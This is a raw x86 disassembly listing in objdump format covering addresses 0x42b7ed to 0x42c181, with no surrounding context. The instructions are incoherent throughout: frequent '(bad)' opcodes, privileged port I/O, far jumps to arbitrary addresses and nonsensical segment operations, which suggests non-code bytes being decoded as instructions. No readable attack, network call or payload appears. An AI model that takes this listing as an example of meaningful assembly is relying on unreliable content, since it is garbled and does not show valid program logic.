  42b7ed:	push   0xd3f38e1d
  42b7f2:	(bad)  
  42b7f4:	push   ss
  42b7f5:	mov    ds:0x62b85df7,eax
  42b7fa:	fild   QWORD PTR [ecx-0x34]
  42b7fd:	jb     0x42b809
  42b7ff:	inc    BYTE PTR [ebx]
  42b801:	mov    esp,0x558d942e
  42b806:	jmp    FWORD PTR [ecx+ebx*8]
  42b809:	scas   eax,DWORD PTR es:[edi]
  42b80a:	pop    ebx
  42b80b:	pop    ds
  42b80c:	mov    DWORD PTR gs:[ebp+0x64],ecx
  42b810:	pop    ebx
  42b811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b812:	jmp    0x114f1c7
  42b817:	adc    ebp,DWORD PTR [edx+0x39fe79f]
  42b81d:	push   0x4e629af6
  42b822:	xlat   BYTE PTR ds:[ebx]
  42b823:	pop    esi
  42b824:	push   edi
  42b825:	pop    ebp
  42b826:	cmp    DWORD PTR [ecx],edi
  42b828:	rcl    BYTE PTR [edx],0xf9
  42b82b:	jp     0x42b7ce
  42b82d:	cmp    eax,0x54736aa1
  42b832:	pop    edi
  42b833:	sbb    cl,0xfd
  42b836:	jp     0x42b7ed
  42b838:	es push ebx
  42b83a:	push   esp
  42b83b:	cmp    BYTE PTR es:[esi-0x62],ah
  42b83f:	lods   al,BYTE PTR ds:[esi]
  42b840:	xchg   ecx,eax
  42b841:	lea    edi,[ecx+0x54]
  42b844:	pop    eax
  42b845:	xchg   esp,eax
  42b846:	cmp    DWORD PTR [edi+0xbf40e59],ebx
  42b84c:	cmp    cl,dl
  42b84e:	pushf  
  42b84f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b850:	dec    ecx
  42b851:	jl     0x42b7d8
  42b853:	lods   al,BYTE PTR ds:[esi]
  42b854:	or     eax,0xd1bface5
  42b859:	fwait
  42b85a:	xchg   eax,esi
  42b85c:	jo     0x42b8ae
  42b85e:	imul   esp,esp,0x14
  42b861:	lea    edi,[ebp+0xd]
  42b864:	xchg   ebp,eax
  42b865:	in     eax,dx
  42b866:	inc    edi
  42b867:	jmp    ecx
  42b869:	cdq    
  42b86a:	dec    esp
  42b86b:	and    al,0x7f
  42b86d:	ins    DWORD PTR es:[edi],dx
  42b86e:	mov    bl,BYTE PTR [ebp-0x2]
  42b871:	imul   eax,esp,0x6b681ed4
  42b877:	loop   0x42b8f6
  42b879:	sub    DWORD PTR [edi+0x30],esp
  42b87c:	arpl   WORD PTR [edi],bx
  42b87e:	sbb    edx,DWORD PTR [ecx-0x7fbf496b]
  42b884:	shl    BYTE PTR [eax-0x43],cl
  42b887:	stos   BYTE PTR es:[edi],al
  42b888:	pop    edx
  42b889:	pop    ss
  42b88a:	rcl    BYTE PTR [eax],1
  42b88c:	lea    ecx,[edx+0xecc40f]
	...
  42b8f2:	add    BYTE PTR [eax],al
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ebp,DWORD PTR [edx]
  42b901:	push   ebp
  42b902:	dec    ebx
  42b903:	dec    ecx
  42b904:	enter  0x1d2,0x0
  42b908:	add    eax,0xe1000001
  42b90d:	push   edx
  42b90e:	pop    es
  42b90f:	pop    ds
  42b910:	mov    ecx,0x5e0bd8da
  42b915:	jl     0x42b8e7
  42b917:	add    eax,0xacf28d3b
  42b91c:	mov    edx,0x1ffbbdc3
  42b921:	(bad)  
  42b922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b923:	outs   dx,BYTE PTR ds:[esi]
  42b924:	xchg   ebx,eax
  42b925:	aaa    
  42b926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b928:	add    eax,DWORD PTR [esp+eiz*4+0x36]
  42b92c:	xchg   ecx,eax
  42b92d:	loop   0x42b90a
  42b92f:	mov    dh,0x8c
  42b931:	xor    ebp,DWORD PTR [eax+0x17]
  42b934:	adc    al,BYTE PTR [edx+0xb]
  42b937:	out    dx,al
  42b938:	push   ss
  42b939:	xchg   BYTE PTR [ebp-0x3aac1182],ch
  42b93f:	push   esi
  42b940:	add    eax,0x962d2670
  42b945:	pop    edx
  42b946:	sub    esi,esp
  42b948:	int    0xb8
  42b94a:	ss jecxz 0x42b960
  42b94d:	rcl    DWORD PTR [edi+0x141e9121],cl
  42b953:	mov    esp,0xbf35dfe2
  42b958:	jmp    0x9478:0xed9df244
  42b95f:	not    DWORD PTR [ebx-0x5d]
  42b962:	inc    ebp
  42b963:	loope  0x42b988
  42b965:	jmp    FWORD PTR [edx-0x34]
  42b968:	scas   al,BYTE PTR es:[edi]
  42b969:	push   ebx
  42b96a:	dec    edx
  42b96b:	addr16 cmp ebp,edx
  42b96e:	xchg   sp,ax
  42b970:	std    
  42b971:	mov    ebx,0xf894b3b9
  42b976:	sbb    BYTE PTR [esi],dh
  42b978:	sbb    BYTE PTR [ebx],0x40
  42b97b:	mov    esp,edx
  42b97d:	fwait
  42b97e:	mov    bh,0x9
  42b980:	pop    eax
  42b981:	push   esi
  42b982:	or     cl,ch
  42b984:	mov    ebp,edi
  42b986:	sub    al,0xc7
  42b988:	cld    
  42b989:	pushf  
  42b98a:	mov    ah,0xb3
  42b98c:	dec    edx
  42b98d:	ja     0x42b9fd
  42b98f:	das    
  42b990:	push   esp
  42b991:	xchg   edx,eax
  42b992:	icebp  
  42b993:	nop
  42b994:	xlat   BYTE PTR ds:[ebx]
  42b995:	dec    ecx
  42b996:	mov    eax,ds:0xb2757e6f
  42b99b:	aad    0xa4
  42b99d:	retf   
  42b99e:	(bad)  
  42b99f:	jne    0x42b932
  42b9a1:	add    ebx,DWORD PTR [esi+ecx*2]
  42b9a4:	cmp    bh,0xa2
  42b9a7:	pop    es
  42b9a8:	mov    ds:0xd29489a6,eax
  42b9ad:	and    ax,0xbec
  42b9b1:	lods   eax,DWORD PTR ds:[esi]
  42b9b2:	mov    bh,0x30
  42b9b4:	mov    ecx,0x33253de7
  42b9b9:	add    al,0x1e
  42b9bb:	or     BYTE PTR [esp+ebp*4-0x58],ch
  42b9bf:	cld    
  42b9c0:	jno    0x42ba2e
  42b9c2:	jb     0x42ba00
  42b9c4:	jb     0x42b9da
  42b9c6:	dec    edx
  42b9c7:	mov    ebp,0x862aa02d
  42b9cc:	(bad)  
  42b9cd:	sub    eax,esi
  42b9cf:	scas   eax,DWORD PTR es:[edi]
  42b9d0:	and    cl,ah
  42b9d2:	sub    eax,0xb7bca58
  42b9d7:	lods   al,BYTE PTR ds:[esi]
  42b9d8:	cmp    eax,0xc174fa5e
  42b9dd:	sub    BYTE PTR [eax+ebp*1],bl
  42b9e0:	outs   dx,DWORD PTR ds:[esi]
  42b9e1:	and    cl,ch
  42b9e3:	std    
  42b9e4:	dec    ebx
  42b9e5:	leave  
  42b9e6:	xor    BYTE PTR gs:[esi+0x20d33bc1],bh
  42b9ed:	or     eax,0xf3da7693
  42b9f2:	push   0x31
  42b9f4:	test   DWORD PTR [ebx+0xa],0x4008d5c5
  42b9fb:	outs   dx,BYTE PTR ds:[esi]
  42b9fc:	xchg   DWORD PTR [ebx],edi
  42b9fe:	pop    esp
  42b9ff:	sub    DWORD PTR [ebp-0x45787ad7],ebp
  42ba05:	cwde   
  42ba06:	adc    DWORD PTR [eax+ebx*2-0x4],0x3ad17b05
  42ba0e:	adc    eax,0x921b
	...
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [esp+ebx*4-0x2c32c833],edx
  42ba86:	add    DWORD PTR [eax],eax
  42ba88:	add    eax,0x33000001
  42ba8d:	fadd   DWORD PTR [eax]
  42ba8f:	add    DWORD PTR [edx+0x6c2d4b89],eax
  42ba95:	shl    BYTE PTR [edi-0x68e303eb],cl
  42ba9b:	sub    al,0x4d
  42ba9d:	(bad)  
  42ba9e:	ins    DWORD PTR es:[edi],dx
  42ba9f:	out    0x63,eax
  42baa1:	hlt    
  42baa2:	dec    esi
  42baa3:	mov    DWORD PTR [edi+0x47a283fc],eax
  42baa9:	and    eax,0xb1bfe0c0
  42baae:	arpl   sp,bp
  42bab0:	and    BYTE PTR [edx],ah
  42bab2:	ja     0x42ba5d
  42bab4:	xchg   ecx,eax
  42bab5:	jbe    0x42bae0
  42bab7:	lods   eax,DWORD PTR ds:[esi]
  42bab8:	jnp    0x42ba5d
  42baba:	js     0x42ba99
  42babc:	mov    WORD PTR [eax+0x9ff7567],?
  42bac2:	in     al,dx
  42bac3:	xchg   ecx,eax
  42bac4:	sub    ebp,DWORD PTR [esi-0x57]
  42bac7:	adc    bl,dl
  42bac9:	mov    esp,0x44ce314d
  42bace:	xchg   ebp,eax
  42bacf:	(bad)  
  42bad0:	clc    
  42bad1:	sbb    BYTE PTR [ecx+0x17ea370a],0x62
  42bad8:	(bad)  
  42bad9:	jl     0x42bb30
  42badb:	xor    edx,DWORD PTR [ebx+0x72]
  42bade:	aaa    
  42badf:	xchg   DWORD PTR [edi+esi*8-0x6beae72],edx
  42bae6:	popa   
  42bae7:	rol    BYTE PTR [eax+0x6028788a],0x9b
  42baee:	pop    ss
  42baef:	les    edx,FWORD PTR [esp+eax*1+0xd]
  42baf3:	inc    ebx
  42baf4:	pop    edi
  42baf5:	and    BYTE PTR [eax+0x29f0baad],ch
  42bafb:	xor    al,0xbb
  42bafd:	cmc    
  42bafe:	adc    DWORD PTR [ebx*2+0x165839b1],ebx
  42bb05:	std    
  42bb06:	mov    edx,edx
  42bb08:	jg     0x42ba9b
  42bb0a:	adc    ebp,DWORD PTR [edx]
  42bb0c:	pusha  
  42bb0d:	std    
  42bb0e:	or     eax,0x923a315d
  42bb13:	cmp    DWORD PTR [edx-0x1de16e3f],0xdcb399f
  42bb1d:	sbb    eax,0x81139bca
  42bb22:	pop    ss
  42bb23:	data16 scas al,BYTE PTR es:[edi]
  42bb25:	push   ebp
  42bb26:	push   ecx
  42bb27:	nop
  42bb28:	mov    edx,0x3275d139
  42bb2d:	jb     0x42bb70
  42bb2f:	jmp    0x32975759
  42bb34:	int    0x8d
  42bb36:	fld    QWORD PTR [eax-0x16]
  42bb39:	adc    ebx,edx
  42bb3b:	ret    0xf37f
  42bb3e:	out    0xf2,eax
  42bb40:	lds    eax,FWORD PTR cs:[esi+0xf9b30e4]
  42bb47:	repz mov edi,DWORD PTR [edx+0x65]
  42bb4b:	inc    eax
  42bb4c:	dec    ebx
  42bb4d:	fadd   DWORD PTR [esi-0x1]
  42bb50:	cmc    
  42bb51:	mov    dh,0xad
  42bb53:	daa    
  42bb54:	in     eax,0x45
  42bb56:	mov    WORD PTR [ebx],fs
  42bb58:	pop    ecx
  42bb59:	and    BYTE PTR [edx],bl
  42bb5b:	push   esp
  42bb5c:	mov    eax,ds:0xc0856ceb
  42bb61:	bound  edi,QWORD PTR [edi]
  42bb63:	push   esp
  42bb64:	int3   
  42bb65:	pop    edx
  42bb66:	and    DWORD PTR [ebx-0x44],0xffffffe5
  42bb6a:	pop    ebp
  42bb6b:	mov    edi,0xbf4ea24f
  42bb70:	pop    ebp
  42bb71:	retf   
  42bb72:	sub    dl,BYTE PTR [ebx+0x34117ad6]
  42bb78:	push   0xdbefde96
  42bb7d:	cmp    DWORD PTR [ecx],eax
  42bb7f:	jp     0x42bb56
  42bb81:	in     al,0x4c
  42bb83:	dec    edx
  42bb84:	(bad)  
  42bb86:	and    ebx,DWORD PTR [ecx+0x6a6d1c4c]
  42bb8c:	sub    DWORD PTR [edx+ebp*2],esp
  42bb8f:	pop    edi
  42bb90:	pusha  
	...
  42bbf1:	add    BYTE PTR [eax],al
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	inc    BYTE PTR [ecx]
  42bc02:	retf   
  42bc03:	mov    al,0xd2
  42bc05:	aam    0x1
  42bc07:	add    BYTE PTR ds:0x65000001,al
  42bc0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc0e:	(bad)  
  42bc0f:	sbb    esi,ebp
  42bc11:	imul   DWORD PTR ds:0xc2e59b66
  42bc17:	lock ins BYTE PTR es:[edi],dx
  42bc19:	daa    
  42bc1a:	aas    
  42bc1b:	xchg   esi,eax
  42bc1c:	jmp    0x9c1c:0x24ef24a7
  42bc23:	dec    edx
  42bc24:	pop    ecx
  42bc25:	sbb    esp,eax
  42bc27:	fadd   DWORD PTR [ebx+0x31ed2fc]
  42bc2d:	nop
  42bc2e:	or     eax,0x6369c927
  42bc33:	ins    BYTE PTR es:[edi],dx
  42bc34:	outs   dx,DWORD PTR ds:[esi]
  42bc35:	mov    al,ds:0xe2c3fce2
  42bc3a:	mov    bh,0xd6
  42bc3c:	and    esi,ebp
  42bc3e:	into   
  42bc3f:	aad    0xd1
  42bc41:	xchg   esi,eax
  42bc42:	out    0xd7,al
  42bc44:	jns    0x42bc82
  42bc46:	retf   
  42bc47:	mov    bl,0x26
  42bc49:	or     bh,dh
  42bc4b:	pop    esp
  42bc4c:	scas   al,BYTE PTR es:[edi]
  42bc4d:	pop    eax
  42bc4e:	into   
  42bc4f:	js     0x42bc69
  42bc51:	mov    esi,0xd691dea0
  42bc56:	pop    eax
  42bc57:	sbb    ecx,ecx
  42bc59:	bound  ecx,QWORD PTR [ebp+0x6e]
  42bc5c:	and    ebp,ebp
  42bc5e:	pop    ebx
  42bc5f:	scas   eax,DWORD PTR es:[edi]
  42bc60:	cdq    
  42bc61:	inc    ebx
  42bc62:	or     dh,BYTE PTR [esi-0x1d7bed67]
  42bc68:	repz sub eax,0x7aa62602
  42bc6e:	mov    esp,0x4ba5347a
  42bc73:	arpl   WORD PTR ds:[eax+0x70cf35fe],dx
  42bc7a:	mov    DWORD PTR [ebx-0x180fee37],esp
  42bc80:	retf   
  42bc81:	test   al,0x83
  42bc83:	ja     0x42bc59
  42bc85:	and    al,0x90
  42bc87:	add    esp,ecx
  42bc89:	cmc    
  42bc8a:	repz and cl,BYTE PTR [ecx]
  42bc8d:	je     0x42bc40
  42bc8f:	lea    edx,[ebx]
  42bc91:	push   esp
  42bc92:	xchg   DWORD PTR [eax+esi*1+0x7b],eax
  42bc96:	sub    BYTE PTR [eax-0x44e46a2b],0x16
  42bc9d:	(bad)
  42bca1:	jg     0x42bccb
  42bca3:	call   0xc9a14629
  42bca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bca9:	xchg   ebx,eax
  42bcaa:	mov    ah,0x51
  42bcac:	xor    ebx,DWORD PTR [ebx-0x1b]
  42bcaf:	cmp    DWORD PTR [ebx-0x7],0xcf4edea0
  42bcb6:	scas   eax,DWORD PTR es:[edi]
  42bcb7:	mov    edx,0x7bf282c1
  42bcbc:	xor    eax,0xc4808d39
  42bcc1:	dec    ebx
  42bcc2:	mov    esp,0xa2c8accf
  42bcc7:	gs add al,0x92
  42bcca:	mov    esp,0xfdd45dcc
  42bccf:	mov    al,ds:0x127bcf08
  42bcd4:	sub    DWORD PTR cs:[edx*8-0x4a51af55],ecx
  42bcdc:	fdiv   QWORD PTR [ebp+0x656b0f2f]
  42bce2:	imul   BYTE PTR [ecx-0x44]
  42bce5:	int    0xc5
  42bce7:	cli    
  42bce8:	xchg   DWORD PTR [edi],edi
  42bcea:	mov    ebx,eax
  42bcec:	jmp    0xb5563f0a
  42bcf1:	dec    ebx
  42bcf2:	cwde   
  42bcf3:	push   0x14
  42bcf5:	ins    BYTE PTR es:[edi],dx
  42bcf6:	fidiv  WORD PTR [ebx]
  42bcf8:	mov    ebp,0x74c5e6dd
  42bcfd:	(bad)  
  42bcfe:	loopne 0x42bd5d
  42bd00:	dec    bx
  42bd02:	and    DWORD PTR [ebp+edi*2-0x6],ebp
  42bd06:	(bad)  
  42bd07:	mov    WORD PTR [ebp+0x27],es
  42bd0a:	adc    al,0x4b
  42bd0c:	scas   eax,DWORD PTR es:[edi]
  42bd0d:	cmp    DWORD PTR [ebx+0x1e],esp
  42bd10:	aaa    
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd7a
  42bd81:	js     0x42bdae
  42bd83:	outs   dx,DWORD PTR ds:[esi]
  42bd84:	xlat   BYTE PTR ds:[ebx]
  42bd85:	aad    0x1
  42bd87:	add    BYTE PTR ds:0x21000001,al
  42bd8d:	inc    ebx
  42bd8e:	mov    ebx,DWORD PTR [esi+0x4c8265c3]
  42bd94:	mov    eax,0xe1c5dbf
  42bd99:	lea    esp,[ebp+edx*8+0x3a]
  42bd9d:	add    edx,edx
  42bd9f:	lea    esp,[edx]
  42bda1:	xor    esp,ebp
  42bda3:	pop    ebp
  42bda4:	inc    eax
  42bda5:	mov    ch,0xf5
  42bda7:	arpl   WORD PTR [ebx],di
  42bda9:	es mov edi,0x41c1112b
  42bdaf:	sahf   
  42bdb0:	push   edi
  42bdb1:	pop    eax
  42bdb2:	repz add cl,BYTE PTR [edi-0x180b31b7]
  42bdb9:	jmp    0xeb354cce
  42bdbe:	mov    ebx,0x86ee6e30
  42bdc3:	cmp    BYTE PTR [ebx],ah
  42bdc5:	jg     0x42bd8a
  42bdc7:	in     eax,dx
  42bdc8:	popa   
  42bdc9:	push   ss
  42bdca:	sar    DWORD PTR [ebp+0x24],cl
  42bdcd:	or     DWORD PTR [eax+0x13a18706],esi
  42bdd3:	or     eax,0xeac09d56
  42bdd8:	push   edx
  42bdd9:	and    DWORD PTR [eax+0x2b],ecx
  42bddc:	fbstp  TBYTE PTR [esi-0x46]
  42bddf:	jmp    0x78c6cc2
  42bde4:	push   si
  42bde6:	imul   ebx,DWORD PTR [edx+0x11c06a54],0xffffffb1
  42bded:	imul   ecx,ebx,0xffffff90
  42bdf0:	cs mov edx,0x16250ed2
  42bdf6:	daa    
  42bdf7:	xor    BYTE PTR [edi-0x20],dl
  42bdfa:	adc    al,0x37
  42bdfc:	and    BYTE PTR [ebx-0x56],bl
  42bdff:	arpl   WORD PTR ds:0x4135ec0d,si
  42be05:	aas    
  42be06:	ret    0x7c25
  42be09:	pop    eax
  42be0a:	cmp    esp,DWORD PTR [ebx+esi*4]
  42be0d:	and    DWORD PTR [edi+0x1f],esp
  42be10:	xor    al,0x8c
  42be12:	push   ds
  42be13:	lods   eax,DWORD PTR ds:[esi]
  42be14:	xor    BYTE PTR [edi],ah
  42be16:	push   ebp
  42be17:	stos   DWORD PTR es:[edi],eax
  42be18:	or     al,0x59
  42be1a:	jno    0x42be31
  42be1c:	inc    esi
  42be1d:	mov    eax,0x9dbf3876
  42be22:	jne    0x42be9f
  42be24:	mov    cl,0xc0
  42be26:	mov    al,0x14
  42be28:	pop    ebx
  42be29:	xor    edx,edx
  42be2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be2c:	pop    ds
  42be2d:	ja     0x42be44
  42be2f:	out    dx,al
  42be30:	add    BYTE PTR [ecx+0x1a],0x2d
  42be34:	mov    ebp,0xa9db8921
  42be39:	addr16 jmp 0xb2b1:0x34056920
  42be41:	cmp    eax,0x4396337d
  42be46:	xor    ebp,eax
  42be48:	push   ecx
  42be49:	push   ss
  42be4a:	jle    0x42be2b
  42be4c:	ja     0x42beab
  42be4e:	in     al,0xb0
  42be50:	jb     0x42be99
  42be52:	mov    esp,0x6bb636c4
  42be57:	cmp    DWORD PTR [ecx-0x79],esi
  42be5a:	rol    BYTE PTR ds:0xcfee6d04,cl
  42be60:	mov    cl,0x4
  42be62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be63:	mov    eax,0xdcc8f787
  42be68:	ret    
  42be69:	sbb    ebx,DWORD PTR [edi-0x2ee16973]
  42be6f:	jmp    0xe28f2280
  42be74:	das    
  42be75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be76:	xor    esi,esi
  42be78:	inc    ecx
  42be79:	sbb    ecx,ebx
  42be7b:	and    ecx,0xffffff8a
  42be7e:	out    dx,eax
  42be7f:	sbb    BYTE PTR [edx+0x12],bh
  42be82:	sub    ah,BYTE PTR [esp+esi*4+0x41]
  42be86:	repnz mov ds,eax
  42be89:	or     al,0xb1
  42be8b:	pop    ss
  42be8c:	sub    al,0x52
  42be8f:	test   dl,bh
	...
  42bef1:	add    BYTE PTR [eax],al
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42be93
  42bf01:	pop    ecx
  42bf02:	adc    BYTE PTR [edi],ch
  42bf04:	(bad)  
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    eax,0x99000001
  42bf0d:	jno    0x42bede
  42bf0f:	call   0x73a7:0x6b7171b4
  42bf16:	and    ah,dh
  42bf18:	adc    eax,0xe628142b
  42bf1d:	mov    ah,0x3c
  42bf1f:	ins    BYTE PTR es:[edi],dx
  42bf20:	call   0xc10b:0x10a2a788
  42bf27:	or     eax,0x9f745a80
  42bf2c:	push   ds
  42bf2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf2e:	mov    DWORD PTR [esi],edi
  42bf30:	dec    ecx
  42bf31:	stos   DWORD PTR es:[edi],eax
  42bf32:	loop   0x42bf26
  42bf34:	adc    DWORD PTR [ebp-0x6e399a9b],esp
  42bf3a:	or     DWORD PTR [bx-0x1f07],esi
  42bf3f:	push   ebp
  42bf40:	cdq    
  42bf41:	xchg   BYTE PTR [ecx+0x16d8f93a],dl
  42bf47:	jecxz  0x42bf44
  42bf49:	popf   
  42bf4a:	xchg   edx,eax
  42bf4b:	xor    DWORD PTR [edx+0x73],edx
  42bf4e:	adc    BYTE PTR [esi+ebx*1-0x68f4da45],bh
  42bf55:	mov    esi,DWORD PTR [edi-0x6f]
  42bf58:	adc    ah,BYTE PTR [ebx]
  42bf5a:	xchg   DWORD PTR [ecx+0x42],edx
  42bf5d:	mov    ah,0xba
  42bf5f:	test   al,0x81
  42bf61:	jnp    0x42bf2b
  42bf63:	xchg   esi,eax
  42bf64:	adc    DWORD PTR [ebx],edx
  42bf66:	(bad)  
  42bf67:	push   ebp
  42bf68:	mov    ds:0xa4365991,eax
  42bf6d:	fldcw  WORD PTR [edx+ebx*1-0x3ef323f8]
  42bf74:	jb     0x42bf89
  42bf76:	scas   al,BYTE PTR es:[edi]
  42bf77:	data16 mov bl,0x95
  42bf7a:	xlat   BYTE PTR ds:[ebx]
  42bf7b:	(bad)  
  42bf7c:	xor    al,0x42
  42bf7e:	in     al,dx
  42bf7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf80:	out    dx,eax
  42bf81:	sbb    DWORD PTR [edi-0x68f9a92],esp
  42bf87:	mov    ds,WORD PTR ds:0xce7948bd
  42bf8d:	and    edi,ebx
  42bf8f:	fsub   DWORD PTR [edx+0x8506206]
  42bf95:	xor    ch,BYTE PTR [esi-0x6d]
  42bf98:	jnp    0x42bf8f
  42bf9a:	mov    bl,0xdb
  42bf9c:	bound  ebx,QWORD PTR [ecx]
  42bf9e:	pop    es
  42bf9f:	int    0x11
  42bfa1:	je     0x42bfae
  42bfa3:	jg     0x42bf98
  42bfa5:	jp     0x42c008
  42bfa7:	jecxz  0x42c012
  42bfa9:	arpl   WORD PTR [esi+edi*1],di
  42bfac:	pop    ecx
  42bfad:	cmp    edx,DWORD PTR [edi+0x23]
  42bfb0:	push   ecx
  42bfb1:	aas    
  42bfb2:	sub    eax,0x29e92f87
  42bfb7:	sbb    dl,BYTE PTR [ecx+0x69e95e8e]
  42bfbd:	bswap  esi
  42bfbf:	jae    0x42bfae
  42bfc1:	clc    
  42bfc2:	ins    DWORD PTR es:[edi],dx
  42bfc3:	cdq    
  42bfc4:	adc    eax,0x632839e0
  42bfc9:	fld    TBYTE PTR [edi+0xc]
  42bfcc:	lods   al,BYTE PTR ds:[esi]
  42bfcd:	ins    DWORD PTR es:[edi],dx
  42bfce:	mov    ds:0xeb62f0ed,eax
  42bfd3:	mov    ah,0xec
  42bfd5:	add    DWORD PTR [eax],eax
  42bfd7:	jb     0x42c022
  42bfd9:	repnz sbb BYTE PTR [eax+ebp*8],ah
  42bfdd:	mov    WORD PTR cs:[eax],?
  42bfe0:	adc    al,0xc3
  42bfe2:	into   
  42bfe3:	xlat   BYTE PTR ds:[ebx]
  42bfe4:	cld    
  42bfe5:	leave  
  42bfe6:	dec    ebp
  42bfe7:	or     dh,BYTE PTR [ecx+edi*8-0x17843dee]
  42bfee:	rcr    DWORD PTR [eax-0x6d],cl
  42bff1:	mov    al,ds:0xc88e54e3
  42bff6:	pop    esi
  42bff7:	adc    cl,BYTE PTR gs:[ebx+0x2b]
  42bffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bffc:	in     eax,dx
  42bffd:	sar    DWORD PTR [ecx-0x31],0xe8
  42c001:	pop    ds
  42c002:	jns    0x42bff7
  42c004:	add    al,0x1a
  42c006:	pop    eax
  42c007:	fistp  QWORD PTR [esi+0x10]
  42c00a:	xor    eax,edi
  42c00c:	pushf  
  42c00d:	xor    ebx,DWORD PTR [esi+0x68]
  42c010:	mov    al,ds:0x0
	...
  42c071:	add    BYTE PTR [eax],al
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	retf   
  42c081:	sbb    eax,DWORD PTR [ecx]
  42c083:	ret    0xd7e1
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    eax,0x6d000001
  42c08d:	call   0xa1b8:0x53d793a1
  42c094:	inc    BYTE PTR [eax+0x284e84b7]
  42c09a:	scas   eax,DWORD PTR es:[edi]
  42c09b:	push   0xd45b1b51
  42c0a0:	outs   dx,BYTE PTR ds:[esi]
  42c0a1:	cmp    bh,bl
  42c0a3:	fldenv [ebp+0x62]
  42c0a6:	test   dl,0x9b
  42c0a9:	and    al,0x62
  42c0ab:	les    esi,FWORD PTR [ebx+0x2e38d0f9]
  42c0b1:	cmp    DWORD PTR [edi],edx
  42c0b3:	sub    eax,0x38b84304
  42c0b8:	push   ebx
  42c0b9:	cmp    cl,0x99
  42c0bc:	adc    bh,BYTE PTR [eax+0x1f]
  42c0bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0c0:	xchg   edx,eax
  42c0c1:	xchg   edx,eax
  42c0c2:	(bad)  
  42c0c3:	stos   BYTE PTR es:[edi],al
  42c0c4:	cmp    DWORD PTR [ebp+0x3ccfa510],0x5f
  42c0cb:	xlat   BYTE PTR ds:[ebx]
  42c0cc:	call   0xddad:0xfa51802d
  42c0d3:	cs xchg edi,eax
  42c0d5:	shl    ebx,1
  42c0d7:	mov    DWORD PTR ds:0x7664151,edi
  42c0dd:	cwde   
  42c0de:	mov    ds:0x44a9cd82,al
  42c0e3:	fnstsw WORD PTR [ecx-0x57]
  42c0e6:	dec    ebx
  42c0e7:	or     al,0xcd
  42c0e9:	sbb    eax,0xe6fd809
  42c0ee:	mov    ds:0x290f560,al
  42c0f3:	inc    ebp
  42c0f4:	rcl    bl,cl
  42c0f6:	fdivp  st(0),st
  42c0f8:	das    
  42c0f9:	jno    0x42c0a2
  42c0fb:	sub    dh,BYTE PTR [ecx-0x63c25546]
  42c101:	cmp    cl,BYTE PTR [ebp-0x45]
  42c104:	xchg   ecx,eax
  42c105:	mov    esp,edx
  42c107:	mov    bl,0x2f
  42c109:	jno    0x42c0bd
  42c10b:	fldcw  WORD PTR [eax]
  42c10d:	sti    
  42c10e:	hlt    
  42c10f:	scas   eax,DWORD PTR es:[edi]
  42c110:	(bad)  
  42c112:	pop    ecx
  42c113:	add    eax,0x32a67f62
  42c118:	into   
  42c119:	mov    al,ds:0x72446e77
  42c11e:	mov    ebx,0xaa368432
  42c123:	sbb    al,al
  42c125:	sbb    ecx,DWORD PTR gs:[esi]
  42c128:	pop    ds
  42c129:	and    bh,BYTE PTR [edi]
  42c12b:	xor    esi,esi
  42c12d:	ds mov al,0x8d
  42c130:	adc    ch,BYTE PTR [esi-0x66f90d91]
  42c136:	test   DWORD PTR [ecx+0x46a66d42],ebp
  42c13c:	xor    BYTE PTR [ebx+0x4b],dl
  42c13f:	data16 and al,BYTE PTR [edi+0x51289155]
  42c146:	adc    eax,DWORD PTR [ecx]
  42c148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c149:	push   edx
  42c14a:	cld    
  42c14b:	xor    cl,BYTE PTR [ecx-0x5b3c8578]
  42c151:	stos   BYTE PTR es:[edi],al
  42c152:	outs   dx,DWORD PTR ds:[esi]
  42c153:	sub    BYTE PTR [ecx-0x6bbc89d7],cl
  42c159:	lds    ebx,FWORD PTR [ebp-0x7f0534e5]
  42c15f:	pop    ebx
  42c160:	sub    bl,BYTE PTR [ebx+ebp*2-0x46]
  42c164:	mov    gs,esp
  42c166:	(bad)  
  42c167:	scas   eax,DWORD PTR es:[edi]
  42c168:	push   eax
  42c169:	outs   dx,DWORD PTR ds:[esi]
  42c16a:	or     eax,0xe75904c
  42c16f:	(bad)  
  42c170:	test   DWORD PTR [esi+edi*2-0x2ece7581],0x9e8d7ebd
  42c17b:	retf   0x742f
  42c17e:	adc    al,0xd9
  42c180:	xchg   edi,eax
  42c181:	inc    edx
